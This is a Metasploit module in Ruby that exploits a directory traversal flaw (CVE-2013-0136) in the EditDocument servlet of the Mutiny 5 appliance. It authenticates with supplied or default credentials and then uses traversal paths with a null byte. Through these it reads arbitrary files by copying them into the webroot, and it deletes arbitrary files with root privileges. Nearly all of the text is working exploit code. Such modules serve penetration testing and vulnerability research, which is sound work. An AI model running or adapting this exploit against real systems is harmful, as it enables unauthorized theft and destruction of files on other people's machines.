##
# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'

class Metasploit3 < Msf::Auxiliary

  include Msf::Exploit::Remote::HttpClient

  def initialize(info = {})
    super(update_info(info,
      'Name'        => 'Mutiny 5 Arbitrary File Read and Delete',
      'Description' => %q{
          This module exploits the EditDocument servlet from the frontend on the Mutiny 5
        appliance. The EditDocument servlet provides file operations, such as copy and
        delete, which are affected by a directory traversal vulnerability. Because of this,
        any authenticated frontend user can read and delete arbitrary files from the system
        with root privileges. In order to exploit the vulnerability a valid user (any role)
        in the web frontend is required. The module has been tested successfully on the
        Mutiny 5.0-1.07 appliance.
      },
      'Author'       =>
        [
          'juan vazquez' # Metasploit module and initial discovery
        ],
      'License'     => MSF_LICENSE,
      'References'  =>
        [
          [ 'CVE', '2013-0136' ],
          [ 'US-CERT-VU', '701572' ],
          [ 'URL', 'https://community.rapid7.com/community/metasploit/blog/2013/05/15/new-1day-exploits-mutiny-vulnerabilities' ]
        ],
      'Actions'     =>
        [
          ['Read'],
          ['Delete']
        ],
      'DefaultAction' => 'Read',
      'DisclosureDate' => 'May 15 2013'))

    register_options(
      [
        Opt::RPORT(80),
        OptString.new('TARGETURI',[true, 'Path to Mutiny Web Service', '/']),
        OptString.new('USERNAME', [ true, 'The user to authenticate as', 'superadmin@mutiny.com' ]),
        OptString.new('PASSWORD', [ true, 'The password to authenticate with', 'password' ]),
        OptString.new('PATH',     [ true, 'The file to read or delete' ]),
      ], self.class)
  end

  def run
    @peer = "#{rhost}:#{rport}"

    print_status("#{@peer} - Trying to login")
    if login
      print_good("#{@peer} - Login successful")
    else
      print_error("#{@peer} - Login failed, review USERNAME and PASSWORD options")
      return
    end

    case action.name
      when 'Read'
        read_file(datastore['PATH'])
      when 'Delete'
        delete_file(datastore['PATH'])
    end
  end

  def read_file(file)

    print_status("#{@peer} - Copying file to Web location...")

    dst_path = "/usr/jakarta/tomcat/webapps/ROOT/m/"
    res = send_request_cgi(
    {
      'uri'           => normalize_uri(target_uri.path, "interface", "EditDocument"),
      'method'        => 'POST',
      'cookie'        => "JSESSIONID=#{@session}",
      'encode_params' => false,
      'vars_post'     => {
        'operation' => 'COPY',
        'paths[]' => "../../../../#{file}%00.txt",
        'newPath' => "../../../..#{dst_path}"
      }
    })

    if res and res.code == 200 and res.body =~ /\{"success":true\}/
      print_good("#{@peer} - File #{file} copied to #{dst_path} successfully")
    else
      print_error("#{@peer} - Failed to copy #{file} to #{dst_path}")
    end

    print_status("#{@peer} - Retrieving file contents...")

    res = send_request_cgi(
      {
        'uri'       => normalize_uri(target_uri.path, "m", ::File.basename(file)),
        'method'    => 'GET'
      })

    if res and res.code == 200
      store_path = store_loot("mutiny.frontend.data", "application/octet-stream", rhost, res.body, file)
      print_good("#{@peer} - File successfully retrieved and saved on #{store_path}")
    else
      print_error("#{@peer} - Failed to retrieve file")
    end

    # Cleanup
    delete_file("#{dst_path}#{::File.basename(file)}")
  end

  def delete_file(file)
    print_status("#{@peer} - Deleting file #{file}")

    res = send_request_cgi(
    {
      'uri'       => normalize_uri(target_uri.path, "interface", "EditDocument"),
      'method'    => 'POST',
      'cookie'    => "JSESSIONID=#{@session}",
      'vars_post' => {
        'operation' => 'DELETE',
        'paths[]' => "../../../../#{file}"
      }
    })

    if res and res.code == 200 and res.body =~ /\{"success":true\}/
      print_good("#{@peer} - File #{file} deleted")
    else
      print_error("#{@peer} - Error deleting file #{file}")
    end
  end

  def login

    res = send_request_cgi(
      {
        'uri'    => normalize_uri(target_uri.path, "interface", "index.do"),
        'method' => 'GET'
      })

    if res and res.code == 200 and res.headers['Set-Cookie'] =~ /JSESSIONID=(.*);/
      first_session = $1
    end

    res = send_request_cgi(
    {
      'uri'       => normalize_uri(target_uri.path, "interface", "j_security_check"),
      'method'    => 'POST',
      'cookie'    => "JSESSIONID=#{first_session}",
      'vars_post' => {
        'j_username' => datastore['USERNAME'],
        'j_password' => datastore['PASSWORD']
      }
    })

    if not res or res.code != 302 or res.headers['Location'] !~ /interface\/index.do/
      return false
    end

    res = send_request_cgi(
    {
      'uri'    => normalize_uri(target_uri.path, "interface", "index.do"),
      'method' => 'GET',
      'cookie' => "JSESSIONID=#{first_session}"
    })

    if res and res.code == 200 and res.headers['Set-Cookie'] =~ /JSESSIONID=(.*);/
      @session = $1
      return true
    end

    return false
  end

end
